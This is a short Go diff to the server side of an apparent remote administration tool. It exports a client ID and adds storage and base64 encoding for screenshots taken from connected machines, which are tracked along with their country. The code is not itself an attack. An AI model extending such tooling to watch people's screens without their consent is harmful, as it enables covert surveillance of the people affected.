@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"io"
@@ -17,7 +18,7 @@ type Client struct {
 	common.Writer
 	common.Reader
 
-	id int
+	Id int
 
 	common.Computer
 	Country     string
@@ -27,12 +28,14 @@ type Client struct {
 		Start   time.Time
 		Current int
 	}
+
+	Screen []byte
 }
 
 func NewClient(conn net.Conn) *Client {
 	client := new(Client)
 
-	client.id = rand.Int()
+	client.Id = rand.Int()
 
 	client.Computer = common.Computer{}
 	client.Conn = conn
@@ -140,4 +143,9 @@ func (c *Client) WritePacket(packet OutgoingPacket) error {
 	}
 
 	return packet.Write(c)
+}
+
+// GetEncodedScreen returns a base64 encoded version of the most recent screenshot
+func (c *Client) GetEncodedScreen() string {
+	return base64.StdEncoding.EncodeToString(c.Screen)
 }
